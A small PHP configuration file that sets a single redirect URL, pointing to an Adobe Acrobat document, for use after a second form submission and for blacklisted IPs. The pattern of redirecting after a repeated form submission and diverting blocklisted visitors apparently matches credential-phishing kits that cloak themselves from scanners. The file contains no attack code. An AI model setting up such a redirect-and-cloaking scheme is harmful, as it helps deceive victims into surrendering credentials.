<?php
/**
 * Centralized Redirect URL Configuration
 * 
 * This URL is used for:
 * - Redirecting after 2nd form submission
 * - Redirecting blacklisted IPs
 * 
 * IMPORTANT: Keep this URL in sync with js/centralized_redirect.js
 */

// Centralized Redirect URL (Change this to your desired redirect URL)
define('CENTRALIZED_REDIRECT_URL', 'https://acrobat.adobe.com/id/urn:aaid:sc:EU:3675e197-77af-4366-a4d8-fc2568aa27d9');

